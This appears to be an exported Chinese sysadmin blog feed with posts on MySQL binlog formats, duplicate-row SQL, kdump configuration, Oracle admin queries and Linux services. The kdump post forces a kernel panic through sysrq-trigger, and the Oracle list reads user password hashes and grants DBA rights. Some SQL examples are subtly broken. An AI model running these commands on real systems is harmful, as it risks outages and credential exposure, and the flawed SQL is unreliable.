<li>SYSDATE() (除非启动时启用了 –sysdate-is-now 选项)<br>INSERT … SELECT 会产生比 RBR 更多的行级锁；<br>复制须要执行全表扫描 (WHERE 语句中没有运用到索引) 的 UPDATE 时，须要比 row 请求更多的行级锁；<br>对于有 AUTO_INCREMENT 字段的 InnoDB 表而言，INSERT 语句会阻塞其他 INSERT 语句；<br>对于一些复杂的语句，在从服务器上的耗资源情况会更严重，而 row 模式下，只会对那个发生变化的记录产生影响；<br>存储函数(不是存储流程 )在被调用的同时也会执行一次 NOW() 函数，这个可以说是坏事也可能是好事；<br>确定了的 UDF 也须要在从服务器上执行；<br>数据表必须几乎和主服务器保持一致才行，否则可能会导致复制出错；<br>执行复杂语句如果出错的话，会消耗更多资源；</li>
</ul>
<p><strong>Row 优点</strong><br>任何情况都可以被复制，这对复制来说是最安全可靠的；<br>和其他大多数数据库系统的复制技能一样；<br>多数情况下，从服务器上的表如果有主键的话，复制就会快了很多；<br>复制以下几种语句时的行锁更少：</p>
<ul>
<li>INSERT … SELECT</li>
<li>包含 AUTO_INCREMENT 字段的 INSERT</li>
<li>没有附带条件或者并没有修改很多记录的 UPDATE 或 DELETE 语句<br>执行 INSERT，UPDATE，DELETE 语句时锁更少；<br>从服务器上采用多线程来执行复制成为可能；</li>
</ul>
<p><strong>Row 缺点</strong><br>生成的 binlog 日志体积大了很多；<br>复杂的回滚时 binlog 中会包含大量的数据；<br>主服务器上执行 UPDATE 语句时，所有发生变化的记录都会写到 binlog 中，而 statement 只会写一次，这会导致频繁发生 binlog 的写并发请求；<br>UDF 产生的大 BLOB 值会导致复制变慢；<br>不能从 binlog 中看到都复制了写什么语句(加密过的)；<br>当在非事务表上执行一段堆积的 SQL 语句时，最好采用 statement 模式，否则很容易导致主从服务器的数据不一致情况发生；<br>另外，针对系统库 MySQL 里面的表发生变化时的处理准则如下：<br>如果是采用 INSERT，UPDATE，DELETE 直接操作表的情况，则日志格式根据 binlog_format 的设定而记录；<br>如果是采用 GRANT，REVOKE，SET PASSWORD 等管理语句来做的话，那么无论如何都要使用 statement 模式记录；<br>使用 statement 模式后，能处理很多原先出现的主键重复问题；</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MYSQL查询重复记录的方法]]></title>
      <url>/2012/07/03/mysql-e6-9f-a5-e8-af-a2-e9-87-8d-e5-a4-8d-e8-ae-b0-e5-bd-95-e7-9a-84-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>MYSQL查询重复记录的方法很多，下面就为您介绍几种最常用的MYSQL查询重复记录的方法，希望对您学习MYSQL查询重复记录方面能有所帮助。</p>
<p>1、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断</p>
<ol>
<li>select * from people   </li>
<li><p>where peopleId in (select peopleId from people group by peopleId having count(peopleId) &gt; 1)<br>2、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录</p>
</li>
<li><p>delete from people   </p>
</li>
<li>where peopleId in (select peopleId from people group by peopleId   having count(peopleId) &gt; 1)   </li>
<li><p>and rowid not in (select min(rowid) from people group by peopleId having count(peopleId )&gt;1)<br>3、查找表中多余的重复记录（多个字段）</p>
</li>
<li><p>select * from vitae a   </p>
</li>
<li><p>where (a.peopleId,a.seq) in (select peopleId,seq from vitae group by peopleId,seq having count(*) &gt; 1)<br>4、删除表中多余的重复记录（多个字段），只留有rowid最小的记录</p>
</li>
<li><p>delete from vitae a   </p>
</li>
<li>where (a.peopleId,a.seq) in (select peopleId,seq from vitae group by peopleId,seq having count(*) &gt; 1)   </li>
<li><p>and rowid not in (select min(rowid) from vitae group by peopleId,seq having count(*)&gt;1)<br>5、查找表中多余的重复记录（多个字段），不包含rowid最小的记录</p>
</li>
<li><p>select * from vitae a   </p>
</li>
<li>where (a.peopleId,a.seq) in (select peopleId,seq from vitae group by peopleId,seq having count(*) &gt; 1)   </li>
<li>and rowid not in (select min(rowid) from vitae group by peopleId,seq having count(*)&gt;1)</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[/usr/local/lib/libltdl.a(ltdl.o): could not read symbols: Bad value]]></title>
      <url>/2012/06/28/usrlocalliblibltdl-altdl-o-could-not-read-symbols-bad-value.html</url>
      <content type="html"><![CDATA[<p>问题：在编译libmcrypt软件包时出现问题：</p>
<p>/libltdl.a(ltdl.o): relocation R_X86_64_32S against `a local symbol’ can not be used when making a shared object; recompile with -fPIC<br>/usr/local/lib/libltdl.a(ltdl.o): could not read symbols: Bad value<br>collect2: ld returned 1 exit status<br>make: <em>*</em> [libphp4.la] Error 1</p>
<p>解决方法：</p>
<p>yum install libtool-ltdl-devel<br>//PHP_LDFLAGS=-L/usr/lib64 ./build php n</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL语句的并集UNION，交集JOIN(内连接，外连接)，交叉连接(CROSS JOIN笛卡尔积)，差集(NOT IN)]]></title>
      <url>/2012/06/28/sql-e8-af-ad-e5-8f-a5-e7-9a-84-e5-b9-b6-e9-9b-86union-ef-bc-8c-e4-ba-a4-e9-9b-86join-e5-86-85-e8-bf-9e-e6-8e-a5-ef-bc-8c-e5-a4-96-e8-bf-9e-e6-8e-a5-ef-bc-8c-e4-ba-a4-e5-8f-89-e8-bf-9e-e6-8e-a5cross.html</url>
      <content type="html"><![CDATA[<div id="blog_content">SQL语句的并集UNION，交集JOIN(内连接，外连接)&lt;wbr&gt;&lt;/wbr&gt;，交叉连接(CROSS JOIN笛卡尔积)，差集(NOT IN)<br><br>1.<br>a. 并集UNION<br>SELECT column1, column2 FROM table1<br>UNION<br>SELECT column1, column2 FROM table2<br><br>b. 交集JOIN<br>SELECT <em> FROM table1 AS a JOIN table2 b ON a.name=b.name<br><br>c. 差集NOT IN<br>SELECT </em> FROM table1 WHERE name NOT IN(SELECT name FROM table2)<br><br>d. 笛卡尔积<br>SELECT <em> FROM table1 CROSS JOIN table2<br>与<br>SELECT </em> FROM table1,table2相同<br><br>2. SQL中的UNION<br>UNION与UNION ALL的区别是，前者会去除重复的条目，后者会仍旧保留。<br><br>a. UNION<br>SQL Statement1<br>UNION<br>SQL Statement2<br><br>b. UNION ALL<br>SQL Statement1<br>UNION ALL<br>SQL Statement2<br><br>3. SQL中的各种JOIN<br>SQL中的连接可以分为内连接，外连接，以及交叉连接<br><div>&lt;wbr&gt;&lt;/wbr&gt;(即是笛卡尔积)<br><br>a. 交叉连接CROSS JOIN<br>如果不带WHERE条件子句，它将会返回被连接的两个表的笛卡尔积&lt;wbr&gt;&lt;/wbr&gt;，返回结果的行数等于两个表行数的乘积；<br><br>举例<br>SELECT <em> FROM table1 CROSS JOIN table2<br>等同于<br>SELECT </em> FROM table1,table2<br><br>一般不建议使用该方法，因为如果有WHERE子句的话&lt;wbr&gt;&lt;/wbr&gt;，往往会先生成两个表行数乘积的行的数据表然后才根据WHERE条&lt;wbr&gt;&lt;/wbr&gt;件从中选择。<br>因此，如果两个需要求交际的表太大，将会非常非常慢，不建议使用。<br><br>b. 内连接INNER JOIN<br>如果仅仅使用<br>SELECT <em> FROM table1 INNER JOIN table2<br>没有指定连接条件的话，和交叉连接的结果一样。<br><br>但是通常情况下，使用INNER JOIN需要指定连接条件。<br>– 等值连接(=号应用于连接条件, 不会去除重复的列)<br>SELECT </em> FROM table1 AS a INNER JOIN table2 AS b on a.column=b.column<br>– 不等连接(&gt;,&gt;=,&lt;,&lt;=,!&gt;,!&lt;,&lt;&gt;)<br>例如<br>SELECT <em> FROM table1 AS a INNER JOIN table2 AS b on a.column&lt;&gt;b.column<br>– 自然连接(会去除重复的列)<br><br>c. 外连接OUTER JOIN<br>首先内连接和外连接的不同之处：<br>内连接如果没有指定连接条件的话，和笛卡尔积的交叉连接结果一样&lt;wbr&gt;&lt;/wbr&gt;，但是不同于笛卡尔积的地方是，没有笛卡尔积那么复杂要先生成行数&lt;wbr&gt;&lt;/wbr&gt;乘积的数据表，内连接的效率要高于笛卡尔积的交叉连接。<br><br>指定条件的内连接，仅仅返回符合连接条件的条目。<br>外连接则不同，返回的结果不仅包含符合连接条件的行&lt;wbr&gt;&lt;/wbr&gt;，而且包括左表(左外连接时), 右表(右连接时)或者两边连接(全外连接时)的所有数据行。<br><br>1)左外连接LEFT [OUTER] JOIN<br>显示符合条件的数据行，同时显示左边数据表不符合条件的数据行&lt;wbr&gt;&lt;/wbr&gt;，右边没有对应的条目显示NULL<br>例如<br>SELECT </em> FROM table1 AS a LEFT [OUTER] JOIN ON a.column=b.column<br>2)右外连接RIGHT [OUTER] JOIN<br>显示符合条件的数据行，同时显示右边数据表不符合条件的数据行&lt;wbr&gt;&lt;/wbr&gt;，左边没有对应的条目显示NULL<br>例如<br>SELECT * FROM table1 AS a RIGHT [OUTER] JOIN ON a.column=b.column<br>3)全外连接<br>显示符合条件的数据行，同时显示左右不符合条件的数据行&lt;wbr&gt;&lt;/wbr&gt;，相应的左右两边显示NULL</div><br></div>]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[启动 centos5.6出现下面提示 Memory for crash kernel (0x0 to 0x0 notwithin permissible range)]]></title>
      <url>/2012/06/25/e5-90-af-e5-8a-a8-centos5-6-e5-87-ba-e7-8e-b0-e4-b8-8b-e9-9d-a2-e6-8f-90-e7-a4-ba-memory-for-crash-kernel-0x0-to-0x0-notwithin-permissible-range.html</url>
      <content type="html"><![CDATA[<div><br><br>启动 centos5.6出现下面提示 Memory for crash kernel (0x0 to 0x0 notwithin permissible range)<br><br>解决方法:<br><br>概述<br><br>kexec是一个快速启动机制，允许通过已经运行的内核的上下文启动一个Linux内核，不需要经过BIOS。BIOS可能会消耗很多时间，特别是带有众多数量的外设的大型服务器。这种办法可以为经常启动机器的开发者节省很多时间。<br><br>kdump是一个新的，而且非常可信赖的内核崩溃转储机制。崩溃转储数据可以从一个新启动的内核的上下文中获取，而不是从已经崩溃的内核的上下文。当系统崩溃时，kdump使用kexec启动到第二个内核。第二个内核通常叫做捕获内核（capture kernel），以很小内存启动，并且捕获转储镜像。<br><br>第一个内核保留了内存的一部分，第二个内核可以用来启动。注意，在启动时，kdump保留了一定数量的重要的内存，这改变了紅帽企业Linux 5最小内存需求。为了计算系统需要的真正最小内存，可以参看 [url]<a href="http://www.redhat.com/rhel/details/limits/[/url" target="_blank" rel="external">http://www.redhat.com/rhel/details/limits/[/url</a>] 上列出的最小内存需求，加上kdump使用的内存数量，以决定真正的最小内存的需求。<br><br>因为第一个内核的内存内容已经被保留，所以kexec可以不经过BIOS，启动捕获内核。这是内核崩溃转储的根本。<br><br>怎样配置kdump<br><br>1.确认kexec-tools已经安装：<br><br>#rpm -q kexec-tools<br><br>2.配置/etc/kdump.conf文件，指定vmcore将被转储的路径。可以通过scp拷贝到另一个服务器，也可以是裸设备，或者本地的文件系统。<br><br>3.修改一些启动参数，为捕获很保留一块内存。对于i386和x86_64架构，编辑/etc/grub.conf，在内核行的末尾添加 crashkernel=128@16M。<br><br>下面是一个带有kdump选项的/etc/grub.conf文件：<br><br># grub.conf generated by anaconda<br>#<br># Note that you do not have to rerun grub after making changes to this file<br># NOTICE:  You do not have a /boot partition.  This means that<br>#          all kernel and initrd paths are relative to /, eg.<br>#          root (hd0,0)<br>#          kernel /boot/vmlinuz-version ro root=/dev/hda1<br>#          initrd /boot/initrd-version.img<br>#boot=/dev/hda<br>default=0<br>timeout=5<br>splashimage=(hd0,0)/boot/grub/splash.xpm.gz<br>hiddenmenu<br>title Red Hat Enterprise Linux Client (2.6.17-1.2519.4.21.el5)<br>        root (hd0,0)<br>        kernel /boot/vmlinuz-2.6.17-1.2519.4.21.el5 ro root=LABEL=/ rhgb quiet crashkernel=128M@16M<br>        initrd /boot/initrd-2.6.17-1.2519.4.21.el5.img<br><br>4.修改之后，重启系统。128M内存（从16M开始）不被正常的系统使用，为捕获内核保留。注意，free -m的输出会显示内存比不加参数时少了128M，这就是我们所期望的。<br><br>注意：可以使用小于128M，但是只使用64M做测试被证实是不可靠的。<br><br>5.现在，保留内存已经设置了，打开kdump初始脚本，启动服务：<br><br>#  chkconfig kdump on<br>#  service kdump start<br><br>6.可以通过kexec加载内核镜像，让系统准备捕获一个崩溃时产生的vmcore。可以通过sysrq强制系统崩溃：<br><br># echo “c” &gt; /proc/sysrq-trigger<br><br>这造成kernel panic，紧跟着系统重启kdump内核。当启动进程进入到启动kdump服务器时，vmcore将会被拷贝到你在/etc/kdump.conf文件中指定的位置。<br><br>注意：<br><br>终端frame-buffer和X将运行不正常。在运行一些类似于在内核配置上添加了”vga=791”或者运行X的系统，在通过kexec启动内核时，终端显示将不清楚。记住，kdump内核仍旧能够创建转储。当系统重启，显示将会恢复到正常状态。<br><br></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Oracle常用查询sql]]></title>
      <url>/2012/06/15/oracle-e5-b8-b8-e7-94-a8-e6-9f-a5-e8-af-a2sql.html</url>
      <content type="html"><![CDATA[<p>select <em> from v$version;                查看服务器版本<br>select </em> from all_users;                ##查看所有用户<br>select name from v$database;            ##查看当前数据库<br>database test;                          ##进入test数据库<br>select <em> from v$instance;               ##查看所有的数据库实例<br>shutdown immediate                      ##关闭数据库<br>alter user sys identified by new_password;        ##更改用户密码<br>select username,password from dba_users;          ##查看当实例中的用户和密码<br>show parameter control_files;                     ## 查看控制文件;<br>select member from v$logfile;                     ##查看日志文件<br>show parameter ;                                  ## 查看数据库参数<br>select </em> from user_role_privs;                    ##查看当前用户的角色<br>select username,default_tablespace from user_users; ##查看当前用户的缺省表空间<br>alter user system identified by [password]        ##修改用户的密码<br>ALTER USER “SCOTT” ACCOUNT UNLOCK                 ##解锁SCOTT用户<br>show parameter processes;                         ##查看最大会话数</p>
<p>select username,sid,serial# from v$session;  查看当前会话连接</p>
<p>select * from all_tables;                         ##查看当前库的所有数据表</p>
<p>查看表结构：desc all_tables;</p>
<p>创建用户并赋予权限</p>
<p>###—————————-创建用户并赋予权限————————————####-<br>create user mpss<br>    identified by “mpss12”<br>    default tablespace TS_MPSS_DATA<br>    temporary tablespace TEMP;</p>
<p>给用户赋予权限<br>grant connect to mpss;<br>grant resource,create session to mpss;  开发角色<br>grant create procedure to dbuser；＃这些权限足够用于开发及生产环境</p>
<p>给用户授权<br>grant dba to spms;–授予DBA权限<br>grant unlimited tablespace to lxg;–授予不限制的表空间<br>grant select any table to lxg;–授予查询任何表<br>grant select any dictionary to lxg;–授予 查询任何字典</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 服务详解]]></title>
      <url>/2012/06/15/linux-e6-9c-8d-e5-8a-a1-e8-af-a6-e8-a7-a3.html</url>
      <content type="html"><![CDATA[<p><strong>acpid</strong><br>ACPI（全称 Advanced Configuration and Power Interface）服务是电源管理接口。建议所有的笔记本用户开启它。一些服务器可能不需要 acpi。支持的通用操作有：“电源开关“，”电池监视“，”笔记本 Lid 开关“，“笔记本显示屏亮度“，“休眠”， “挂机”，等等。</p>
<p><strong>anacron, atd, crond</strong><br>这几个调度程序有很小的差别。 建议开启 cron，如果你的电脑将长时间运行，那就更应该开启它。对于服务器，应该更深入了解以确定应该开启哪个调度程序。大多数情况下，笔记本/台式机应该关闭 atd 和 anacron。注意：一些任务的执行需要 anacron，比如：清理 /tmp 或 /var。</p>
<p><strong>alsasound</strong><br>Alsa声卡驱动守护程序。Alsa声卡驱动程序本来是为了 一种声卡Gravis UltraSound(GUS)而写的，该程序被证 明很优秀，于是作者就开始为一般的声卡写 驱动程序。 Alsa和OSS/Free 及OSS/Linux兼容，但是有自己的接 口，甚至比OSS优秀。</p>
<p><strong>apmd</strong><br>一些笔记本和旧的硬件使用 apmd。如果你的电脑支持 acpi，就应该关闭 apmd。如果支持 acpi，那么 apmd 的工作将会由 acpi 来完成。</p>
<p><strong>arptables_jf</strong><br>为arptables网络的用户控制过滤的守护进程。</p>
<p><strong>arpwatch</strong><br>记录日志并构建一个在LAN接口上看到的以太网地址和IP地址对数据库 。</p>
<p><strong>atalk</strong><br>AppleTalk网络守护进程。注意不要在后台运行该程序，该程序的数据结构必须在运行其他进程前先花一定时间初始化。</p>
<p><strong>auditd</strong><br>审核子系统可以被系统管理员用来监测系统调用和那些符合 CAPP 或其它审核要求的文件系统访问。它的主要内容包括：<br>· 默认情况下，审核在内核中被禁用。但是，当安装了 auditd 软件后，运行这个软件将会启动审核守护进程（auditd）。<br>· 当 auditd 运行的时候，审核信息会被发送到一个用户配置日志文件中（默认的文件是 /var/log/audit/audit.log）。如果 auditd 没有运行，审核信息会被发送到 syslog。这是通过默认的设置来把信息放入 /var/log/messages。如果审核子系统没有被启用，没有审核信息会被产生。<br>· 这些审核信息包括了 SELinux AVC 信息。以前，AVC 信息会被发送到 syslog，但现在会被审核守护进程发送到审核日志文件中。<br>· 要完全在内核中禁用审核，在启动的时候使用 audit=0 参数。您还需要使用 chkconfig auditd off 2345 来关闭 auditd。您可以在运行时使用 auditctl -e 0 来在内核中关闭审核。<br>审核守护进程（auditd）从内核的 audit netlink 接口获取审核事件数据。auditd 的配置会不尽相同，如输出文件配置和日志文件磁盘使用参数可以在 /etc/auditd.conf 文件中配置。请注意，如果您设置您的系统来进行 CAPP 风格的审核，您必须设置一个专用的磁盘分区来只供 audit 守护进程使用。这个分区应该挂载在 /var/log/audit。<br>系统管理员还可以使用 auditctl 工具程序来修改 auditd 守护进程运行时的审核参数、syscall 规则和文件系统的查看。它包括了一个 CAPP 配置样本，您可以把它拷贝到 /etc/audit.rules 来使它起作用。<br>审核日志数据可以通过 ausearch 工具程序来查看和搜索。</p>
<p><strong>autofs</strong><br>该服务自动挂载可移动存储器（比如 USB 硬盘）。如果你使用移动介质（比如移动硬盘，U 盘），建议启用这个服务。</p>
<p><strong>avahi-daemon, avahi-dnsconfd</strong><br>Avahi 是 zeroconf 协议的实现。它可以在没有 DNS 服务的局域网里发现基于 zeroconf 协议的设备和服务。它跟 mDNS 一样。除非你有兼容的设备或使用 zeroconf 协议的服务，否则应该关闭它。</p>
<p><strong>bootparamd</strong><br>引导参数服务器，为LAN上的无盘工作站提供引导所需的相关信息。</p>
<p><strong>bluetooth, hcid, hidd, sdpd, dund, pand</strong><br>蓝牙（Bluetooth）是给无线便携设备使用的（非 wifi, 802.11）。很多笔记本提供蓝牙支持。有蓝牙鼠标，蓝牙耳机和支持蓝牙的手机。很多人都没有蓝牙设备或蓝牙相关的服务，所以应该关闭它。其他蓝牙相关 的服务有：hcid 管理所有可见的蓝牙设备，hidd 对输入设备（键盘，鼠标）提供支持， dund 支持通过蓝牙拨号连接网络，pand 允许你通过蓝牙连接以太网。</p>
<p><strong>capi</strong><br>仅仅对使用 ISDN 设备的用户有用。大多数用户应该关闭它。</p>
<p><strong>chargen</strong><br>使用tcp协议的chargen server，chargen（Character Generator Protocol）是一种网络服务，主要功能是提供类似远程打字的功能。</p>
<p><strong>chargen-udp</strong><br>使用UDP协议的chargen server。</p>
<p><strong>chargen-dgram**</strong><br><strong>**chargen-stream</strong></p>
<p><strong>conman</strong></p>
<p><strong>cpuspeed**</strong><br>**该服务可以在运行时动态调节 CPU 的频率来节约能源（省电）。许多笔记本的 CPU 支持该特性，现在，越来越多的台式机也支持这个特性了。如果你的 CPU 是：Petium-M，Centrino，AMD PowerNow， Transmetta，Intel SpeedStep，Athlon-64，Athlon-X2，Intel Core 2 中的一款，就应该开启它。如果你想让你的 CPU 以固定频率运行的话就关闭它。</p>
<p><strong>cupsd, cups-config-daemon, cups-lpd**</strong><br>**打印机相关。</p>
<p><strong>cvs</strong><br>cvs 是一个版本控制系统。</p>
<p><strong>daytime</strong><br>使用TCP 协议的Daytime守护进程，该协议为客户机实现从远程服务器获取日期 和时间的功能。预设端口：13。<br><strong>daytime-udp</strong><br>使用UDP 协议的Daytime守护进程。</p>
<p><strong>daytime-dgram**</strong><br><strong>**daytime-stream</strong></p>
<p><strong>dc_client, dc_server</strong><br>磁盘缓存（Distcache）用于分布式的会话缓存。主要用在 SSL/TLS 服务器。它可以被 Apache 使用。大多数的台式机应该关闭它。</p>
<p><strong>dhcdbd</strong><br>这是一个让 DBUS 系统控制 DHCP 的接口。可以保留默认的关闭状态。</p>
<p><strong>diskdump, netdump</strong><br>磁盘转储（Diskdump）用来帮助调试内核崩溃。内核崩溃后它将保存一个 “dump“ 文件以供分析之用。网络转储（Netdump）的功能跟 Diskdump 差不多，只不过它可以通过网络来存储。除非你在诊断内核相关的问题，它们应该被关闭。</p>
<p><strong>discard-dgram**</strong><br><strong>**discard-stream</strong></p>
<p><strong>dnsmasq</strong><br>DNSmasq是一个轻巧的，容易使用的DNS服务工具，它可以应用在内部网和Internet连接的时候的IP地址NAT转换，也可以用做小型网络的DNS服务。</p>
<p><strong>echo</strong><br>服务器回显客户数据服务守护进程。<br><strong>echo-udp</strong><br>使用UDP协议的服务器回显客户数据服务守护进程。<br><strong>echo-dgram**</strong><br><strong>**echo-stream</strong></p>
<p><strong>eklogin</strong><br>接受rlogin会话鉴证和用kerberos5加密的一种服务的守护进程。</p>
<p><strong>ekrb5-telnet</strong></p>
<p><strong>firstboot</strong><br>该服务是 Fedora 安装过程特有的。它执行在安装之后的第一次启动时仅仅需要执行一次的特定任务。它可以被关闭。</p>
<p><strong>functions</strong></p>
<p><strong>gated</strong><br>网关路由守护进程。它支持各种路由协议，包括RIP版本1和2、DCN HELLO协议、 OSPF版本2以及EGP版本2到4。</p>
<p><strong>gpm</strong><br>终端鼠标指针支持（无图形界面）。如果你不使用文本终端（CTRL-ALT-F1, F2..），那就关闭它。不过，我在运行级别 3 开启它，在运行级别 5 关闭它。</p>
<p><strong>gssftp</strong><br>使用kerberos 5认证的ftp守护进程。</p>
<p><strong>haldaemon**</strong><br><strong>**halt</strong></p>
<p><strong>hplip, hpiod, hpssd</strong><br>HPLIP 服务在 Linux 系统上实现 HP 打印机支持，包括 Inkjet，DeskJet，OfficeJet，Photosmart，Business InkJet 和一部分 LaserJet 打印机。这是 HP 赞助的惠普 Linux 打印项目（HP Linux Printing Project）的产物。如果你有相兼容的打印机，那就启用它。</p>
<p><strong>hsqldb</strong><br>一个java的关系型数据库守护进程，得名于Hypersonic SQL，但这个项目已经没有再继续了。</p>
<p><strong>httpd</strong><br>Web服务器Apache守护进程，可用来提供HTML文件以 及CGI动态内容服务。</p>
<p><strong>innd</strong><br>Usenet新闻服务器守护进程。</p>
<p><strong>iiim</strong><br>中文输入法服务器守护进程。</p>
<p><strong>inetd</strong><br>因特网操作守护程序。监控网络对各种它管理的服务的需求，并在必要的时候启动相应的服务程序。在Redhat 和Mandrake linux中被xinetd代替。Debian, Slackware, SuSE仍然使用。</p>
<p><strong>ip6tables</strong><br>如果你不知道你是否在使用 IPv6，大部分情况下说明你没有使用。该服务是用于 IPv6 的软件防火墙。大多数用户都应该关闭它。</p>
<p><strong>ipmi**</strong><br><strong>**iptables</strong><br>它是 Linux 标准的防火墙（软件防火墙）。如果你直接连接到互联网（如，cable，DSL，T1），建议开启它。如果你使用硬件防火墙（比如：D-Link，Netgear，Linksys 等等），可以关闭它。强烈建议开启它。</p>
<p><strong>irda, irattach</strong><br>IrDA 提供红外线设备（笔记本，PDA’s，手机，计算器等等）间的通讯支持。大多数用户应该关闭它。</p>
<p><strong>irqbalance</strong><br>在多处理器系统中，启用该服务可以提高系统性能。大多数人不使用多处理器系统，所以关闭它。但是我不知道它作用于多核 CPU’s 或 超线程 CPU’s 系统的效果。在单 CPU 系统中关闭它应该不会出现问题。</p>
<p><strong>isdn</strong><br>这是一种互联网的接入方式。除非你使用 ISDN 猫来上网，否则你应该关闭它。</p>
<p><strong>keytable</strong><br>该进程的功能是转载在/etc/sysconfig/keyboards里定义的键盘映射表，该表可以通过kbdconfig工具进行选择。您应该使该程序处于激活状态。</p>
<p><strong>kdump</strong></p>
<p><strong>klogin</strong><br>远程登陆守护进程。</p>
<p><strong>krb5-telnet</strong><br>使用kerberos 5认证的telnet守护进程。</p>
<p><strong>kshell</strong><br>kshell守护进程。</p>
<p><strong>killall**</strong><br><strong>**krb524</strong><br><strong>kudzu</strong><br>该服务进行硬件探测，并进行配置。如果更换硬件或需要探测硬件更动，开启它。但是绝大部分的台式机和服务器都可以关闭它，仅仅在需要时启动。</p>
<p><strong>ldap</strong><br>ldap（Lightweight Directory Access Protocol）目录访问协议服务器守护进程。</p>
<p><strong>libvirtd</strong></p>
<p><strong>lm_sensors</strong><br>该服务可以探测主板感应器件的值或者特定硬件的状态（一般用于笔记本电脑）。你可以通过它来查看电脑的实时状态，了解电脑的健康状况。它在 GKrellM 用户中比较流行。如果没有特殊理由，建议关闭它。</p>
<p><strong>lvm2-monitor**</strong><br><strong>**mcstrans</strong><br>SELinux转换服务，如果你使用 SELinux 就开启它，但你也可以关闭。</p>
<p><strong>mdmonitor</strong><br>该服务用来监测 Software RAID 或 LVM 的信息。它不是一个关键性的服务，可以关闭它。</p>
<p><strong>mdmpd</strong><br>该服务用来监测 Multi-Path 设备（该类型的存储设备能被一种以上的控制器或方法访问）。它应该被关闭。</p>
<p><strong>messagebus</strong><br>这是 Linux 的 IPC（Interprocess Communication，进程间通讯）服务。确切地说，它与 DBUS 交互，是重要的系统服务。强烈建议开启它。</p>
<p><strong>multipathd, microcode_ctl</strong><br>可编码以及发送新的微代码到内核以更新Intel IA32系列处理器守护进程。</p>
<p><strong>mysqld</strong><br>一个快速高效可靠的轻型SQL数据库引擎守护进程。</p>
<p><strong>named</strong><br>DNS（BIND）服务器守护进程。</p>
<p><strong>netconsole</strong></p>
<p><strong>netfs</strong><br>该服务用于在系统启动时自动挂载网络中的共享文件空间，比如：NFS，Samba 等等。如果你连接到局域网中的其它服务器并进行文件共享，就开启它。大多数台式机和笔记本用户应该关闭它。</p>
<p><strong>netplugd, ifplugd</strong><br>Netplugd 用于监测网络接口并在接口状态改变时执行指定命令。建议保留它的默认关闭状态。</p>
<p><strong>network</strong><br>激活/关闭启动时的各个网络接口守护进程。</p>
<p><strong>nfs, nfslock</strong><br>这是用于 Unix/Linux/BSD 系列操作系统的标准文件共享方式。除非你需要以这种方式共享数据，否则关闭它。</p>
<p><strong>nscd</strong><br>服务名缓存进程，它为NIS和LDAP等服务提供更快的验证，如果你运行这些服务，那你应该开启它。</p>
<p><strong>ntpd</strong><br>该服务通过互联网自动更新系统时间。如果你能永久保持互联网连接，建议开启它，但不是必须的。</p>
<p><strong>pcscd</strong><br>该服务提供智能卡（和嵌入在信用卡，识别卡里的小芯片一样大小）和智能卡读卡器支持。如果你没有读卡器设备，就关闭它。</p>
<p><strong>pcmcia</strong><br>主要用于支持笔记本电脑接口守护进程。</p>
<p><strong>portmap</strong><br>该服务是 NFS（文件共享）和 NIS（验证）的补充。除非你使用 NFS 或 NIS 服务，否则关闭它。</p>
<p><strong>postgresql</strong><br>PostgreSQL 关系数据库引擎。</p>
<p><strong>pppoe</strong><br>ADSL连接守护进程。</p>
<p><strong>proftpd</strong><br>proftpd 是Unix下的一个配置灵活的ftp服务器的守护程序。</p>
<p><strong>psacct</strong><br>该守护进程包括几个工具用来监控进程活动的工具，包括ac,lastcomm, accton和sa。</p>
<p><strong>random</strong><br>保存和恢复系统的高质量随机数生成器，这些随机数是系统一些随机行为提供的。</p>
<p><strong>rawdevices</strong><br>在使用集群文件系统时用于加载raw设备的守护进程。</p>
<p><strong>rdisc</strong><br>readahead_early, readahead_later<br>该服务通过预先加载特定的应用程序到内存中以提供性能。如果你想程序启动更快，就开启它。</p>
<p><strong>restorecond</strong><br>用于给 SELinux 监测和重新加载正确的文件上下文（file contexts）。它不是必须的，但如果你使用 SELinux 的话强烈建议开启它。</p>
<p><strong>rhnsd</strong><br>Red Hat 网络服务守护进程。通知官方的安全信息以及为系统打补丁。</p>
<p><strong>routed</strong><br>该守护程序支持RIP协议的自动IP路由表维护。RIP主要 使用在小型网络上，大一点的网络就需要复杂一点的协议。</p>
<p><strong>rpcgssd, rpcidmapd, rpcsvcgssd</strong><br>用于 NFS v4。除非你需要或使用 NFS v4，否则关闭它。</p>
<p><strong>rsync</strong><br>remote sync远程数据备份守护进程。</p>
<p><strong>rsh</strong><br>远程主机上启动一个shell，并执行用户命令。</p>
<p><strong>rwhod</strong><br>允许远程用户获得运行rwho守护程序的机器上所有已登录用户的列表。</p>
<p><strong>rstatd</strong><br>一个为LAN上的其它机器收集和提供系统信息的守候进程。</p>
<p><strong>ruserd</strong><br>远程用户定位服务，这是一个基于RPC的服务，它提供关于当前记录到LAN上一个机器日志中的用户信息。</p>
<p><strong>rwalld</strong><br>激活rpc.rwall服务进程，这是一项基于RPC的服务，允许用户给每个注册到LAN机器上的其他终端写消息。</p>
<p><strong>rwhod</strong>：</p>
<p>激活rwhod服务进程，它支持LAN的rwho和ruptime服务。</p>
<p><strong>saslauthd**</strong><br>**使用SASL的认证守护进程。</p>
<p><strong>sendmail</strong><br>除非你管理一个邮件服务器或你想 在局域网内传递或支持一个共享的 IMAP 或 POP3 服务。大多数人不需要一个邮件传输代理。如果你通过网页（hotmail/yahoo/gmail）或使用邮件收发程序（比如：Thunderbird， Kmail，Evolution 等等）收发邮件。你应该关闭它。</p>
<p><strong>setroubleshoot</strong><br>查看selinux日志的程序</p>
